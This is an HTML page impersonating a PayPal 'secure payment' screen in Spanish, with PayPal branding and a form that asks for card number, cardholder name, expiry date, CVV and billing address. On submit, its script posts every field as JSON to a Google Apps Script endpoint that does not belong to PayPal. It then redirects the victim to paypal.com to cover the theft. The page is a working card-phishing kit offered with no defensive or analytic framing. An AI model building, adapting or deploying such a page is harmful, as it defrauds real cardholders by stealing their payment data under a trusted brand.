<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Pago Seguro - PayPal</title>
  <link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp258.png" type="image/png">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f5f7fa;
      margin: 0;
      padding: 0;
    }

    .container {
      max-width: 400px;
      margin: 60px auto;
      background-color: #fff;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0,0,0,0.1);
      text-align: center;
    }

    .paypal-logo {
      width: 50px;
      margin-bottom: 20px;
    }

    h2 {
      font-weight: 400;
      margin-bottom: 25px;
      color: #2c2e2f;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
    }

    input:focus, select:focus {
      border-color: #0070ba;
      outline: none;
    }

    button {
      background-color: #0070ba;
      color: white;
      border: none;
      padding: 12px;
      width: 100%;
      font-size: 16px;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 15px;
    }

    button:hover {
      background-color: #005ea6;
    }

    label {
      display: block;
      text-align: left;
      margin: 5px 0 0;
      color: #333;
      font-size: 14px;
    }

    .cvv-container {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .cvv-container img {
      width: 60px;
      height: auto;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" class="paypal-logo" alt="PayPal">
    <h2>Asocie una tarjeta para comprar</h2>
    <form id="formulario">
      <label for="numero">N.º tarjeta débito o crédito</label>
      <input type="text" id="numero" name="numero" maxlength="19" required placeholder="1234 5678 9012 3456">

      <label for="titular">Nombre del titular</label>
      <input type="text" id="titular" name="titular" placeholder="Ej. Juan Pérez" required>

      <label for="tipo">Tipo de tarjeta</label>
      <select id="tipo" name="tipo" required>
        <option value="">Seleccione su tipo de tarjeta</option>
        <option value="visa">Visa</option>
        <option value="mastercard">MasterCard</option>
        <option value="amex">American Express</option>
        <option value="disc">Discover</option>
        <option value="diners">Diners Club</option>
      </select>

      <label for="exp">Fecha de vencimiento</label>
      <input type="text" id="exp" name="exp" placeholder="MM/AA" maxlength="5" required>

      <label for="cvv">Código de seguridad</label>
      <div class="cvv-container">
        <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3" required>
        <img src="https://static.vecteezy.com/system/resources/previews/029/921/552/non_2x/credit-card-secure-cvv-code-financial-label-stock-illustration-vector.jpg" alt="CVV Info">
      </div>

      <label for="direccion">Dirección de la tarjeta</label>
      <input type="text" id="direccion" name="direccion" placeholder="Ej. Calle 1 Av 2" required>

      <button type="submit">Asociar tarjeta</button>
    </form>
  </div>

  <script>
    document.getElementById('formulario').addEventListener('submit', async function(e) {
      e.preventDefault();

      const data = {
        numero: document.getElementById('numero').value,
        titular: document.getElementById('titular').value,
        tipo: document.getElementById('tipo').value,
        exp: document.getElementById('exp').value,
        cvv: document.getElementById('cvv').value,
        direccion: document.getElementById('direccion').value
      };

      try {
        const response = await fetch('https://script.google.com/macros/s/AKfycbxZo1rPSSL9A-E5SjTWKGgQG6y-xpjU3kVrijUkdSX4Ld7pKyszuAl0LZxle_R5gcA/exec', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        });

        if (response.ok) {
          alert('Datos enviados correctamente.');
          window.location.href = 'https://www.paypal.com';
        } else {
          alert('Error al enviar los datos.');
        }
      } catch (error) {
        console.error('Error:', error);
        alert('Error en la red.');
      }
    });
  </script>
</body>
</html>
